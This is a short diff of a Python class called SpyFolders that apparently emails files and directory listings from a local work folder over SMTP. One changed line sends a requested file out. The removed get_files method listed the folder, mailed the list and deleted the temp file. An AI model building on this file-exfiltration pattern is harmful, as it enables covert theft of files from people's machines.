@@ -32,7 +32,7 @@ class SpyFolders():
                 else:
                     print("more than 1 file request,someting is wrong")
 
-            mail_smtp.send_smtp_message("the wanted file","the wanted file",filename)
+            mail_smtp.send_smtp_message("the wanted file","the wanted file",request_file)
             return
         
         os.chdir("d:"+os.sep+"work")
@@ -47,18 +47,7 @@ class SpyFolders():
         if os.path.exists(filename):
             os.remove(filename)
 
-    def get_files(self):
-        os.chdir("d:"+os.sep+"work")
-        filename = "d:/dircontents.txt"
-        files = self.get_files_list_from_dir(os.getcwd())
-        with open(filename,"a") as f:
-            f.seek(0,0)
-            for item in files:
-                f.write('%s\n'%(item))
-                
-        mail_smtp.send_smtp_message("files list","files list",filename)
-        if os.path.exists(filename):
-            os.remove(filename)
+
         
         
 
